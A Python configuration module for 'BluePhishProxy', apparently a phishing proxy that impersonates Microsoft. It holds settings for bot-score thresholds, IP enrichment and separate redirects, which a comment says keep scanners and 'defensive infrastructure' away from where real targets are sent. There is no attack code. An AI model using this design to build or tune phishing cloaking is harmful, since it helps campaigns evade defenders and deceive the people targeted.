"""Runtime configuration for BluePhishProxy.

All settings are overridable via environment variables so the same image can be
redeployed across engagements without code changes.
"""

from __future__ import annotations

import os
import secrets
from dataclasses import dataclass, field
from pathlib import Path


def _env_bool(name: str, default: bool) -> bool:
    raw = os.environ.get(name)
    if raw is None:
        return default
    return raw.strip().lower() in {"1", "true", "yes", "on"}


def _env_int(name: str, default: int) -> int:
    raw = os.environ.get(name)
    if raw is None:
        return default
    try:
        return int(raw)
    except ValueError:
        return default


@dataclass(slots=True)
class Config:
    """Immutable-ish runtime configuration."""

    # --- network / server -------------------------------------------------
    host: str = field(default_factory=lambda: os.environ.get("BPP_HOST", "0.0.0.0"))
    port: int = field(default_factory=lambda: _env_int("BPP_PORT", 5000))
    debug: bool = field(default_factory=lambda: _env_bool("BPP_DEBUG", False))

    # Number of trusted reverse proxies in front of the app (for X-Forwarded-*).
    trusted_proxies: int = field(default_factory=lambda: _env_int("BPP_TRUSTED_PROXIES", 1))

    # --- campaign ---------------------------------------------------------
    # Where a *clean* human session is sent once profiling is complete.
    safe_redirect_url: str = field(
        default_factory=lambda: os.environ.get(
            "BPP_SAFE_REDIRECT_URL", "https://www.microsoft.com/en-us/security"
        )
    )
    # Where a *flagged* (scanner/bot) session is sent. Kept separate so that
    # defensive infrastructure never reaches the same place as real targets.
    flagged_redirect_url: str = field(
        default_factory=lambda: os.environ.get(
            "BPP_FLAGGED_REDIRECT_URL", "https://www.microsoft.com/en-us/security"
        )
    )
    brand_name: str = field(default_factory=lambda: os.environ.get("BPP_BRAND", "Microsoft"))

    # --- detection tuning -------------------------------------------------
    # A visit scoring >= bot_threshold is treated as automated/defensive infra.
    bot_threshold: int = field(default_factory=lambda: _env_int("BPP_BOT_THRESHOLD", 50))
    # A visit scoring >= suspicious_threshold (but below bot) is "suspicious".
    suspicious_threshold: int = field(
        default_factory=lambda: _env_int("BPP_SUSPICIOUS_THRESHOLD", 25)
    )

    # --- enrichment -------------------------------------------------------
    enable_ip_enrichment: bool = field(
        default_factory=lambda: _env_bool("BPP_IP_ENRICHMENT", True)
    )
    ipinfo_token: str | None = field(default_factory=lambda: os.environ.get("BPP_IPINFO_TOKEN"))
    ipinfo_timeout: float = field(
        default_factory=lambda: float(os.environ.get("BPP_IPINFO_TIMEOUT", "3.0"))
    )

    # --- storage ----------------------------------------------------------
    data_dir: Path = field(
        default_factory=lambda: Path(os.environ.get("BPP_DATA_DIR", "data"))
    )
    analytics_dir: Path = field(
        default_factory=lambda: Path(os.environ.get("BPP_ANALYTICS_DIR", "analytics"))
    )
    log_file: Path = field(
        default_factory=lambda: Path(os.environ.get("BPP_LOG_FILE", "access.log"))
    )

    # --- session ----------------------------------------------------------
    # A stable secret keeps signed session cookies valid across restarts and
    # multiple workers. If unset we generate an ephemeral one and warn.
    secret_key: str = field(
        default_factory=lambda: os.environ.get("BPP_SECRET_KEY") or ""
    )
    session_max_age: int = field(default_factory=lambda: _env_int("BPP_SESSION_MAX_AGE", 3600))

    def __post_init__(self) -> None:
        self.data_dir = Path(self.data_dir)
        self.analytics_dir = Path(self.analytics_dir)
        self.log_file = Path(self.log_file)

    @property
    def secret_key_is_ephemeral(self) -> bool:
        return not os.environ.get("BPP_SECRET_KEY")

    def resolved_secret_key(self) -> str:
        return self.secret_key or secrets.token_hex(32)
